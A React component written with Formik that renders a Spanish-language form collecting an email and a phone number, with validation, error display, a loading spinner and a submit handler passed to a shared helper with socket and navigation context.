import { useFormik } from 'formik'
import { useContext, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { SocketContext, UserDataContext } from '../../../../context'

import { EmailAndPhoneInput } from './EmailAndPhoneInput'
import { emailAndPhoneValidate } from '../../../../security/emailAndPhoneValidate'
import { ErrorEmailAndPhone } from './ErrorEmailAndPhone'
import { Spiner } from '../../../Spiner'
import { submitBase } from '../../../../helpers/submitBase'

const valuesData = { correo: '', celular: '' }

export const EmailAndPhone = ({urlToNavigate, spiner, timeLoader, endUrl = ''}) => {
    
    const navigate = useNavigate()
    
    const { addData } = useContext(UserDataContext);
    const { socket } = useContext(SocketContext);    
    const [showSpiner , SetshowSpiner] = useState(false);
    const dataImportant = { addData, socket, SetshowSpiner, urlToNavigate, spiner, timeLoader, navigate }

    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => emailAndPhoneValidate({values}),
        onSubmit: async(valuesData) => submitBase({dataImportant, valuesData, endUrl})
    })

    return (
        <div>
            {/* Spiner de carga */}
            {
                showSpiner === true ? <Spiner /> : null
            }

            {/* Aqui ira las notificacion de error */}
            <ErrorEmailAndPhone errors={errors} touched={touched} />
            
            {/* Colocar diseño base */}
            <form onSubmit={handleSubmit}>

                <EmailAndPhoneInput
                    handleBlur={handleBlur} 
                    handleChange={handleChange} 
                    correo={values.correo} 
                    celular={values.celular}  
                />

                <button 
                    disabled={(touched.correo && errors.correo) || (touched.celular && errors.celular) ? true : false}
                    className='bg-blue-400 px-4 py-1 rounded'
                    type='submit'
                >
                    Ingresar
                </button>
            </form>
        </div>
    )
}
